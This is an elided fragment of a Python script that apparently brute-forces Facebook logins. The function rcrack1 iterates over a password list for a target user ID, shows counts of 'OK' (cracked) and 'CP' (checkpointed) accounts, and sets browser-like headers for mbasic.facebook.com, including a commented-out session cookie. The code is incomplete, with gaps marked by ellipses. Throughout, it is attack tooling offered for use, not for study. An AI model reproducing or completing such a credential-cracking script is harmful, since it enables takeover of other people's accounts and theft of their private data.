#SC MAKED BY Alif Hawladar 🤣 and Fuked By FB-KING 🙄
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mALIF\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            header_freefb = {'authority':'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0',
    # 'cookie': 'datr=7MsXZCObcFI3i_lUuwUSL4bT; sb=7MsXZCTjuGr3ynQOX1m0RUL4',
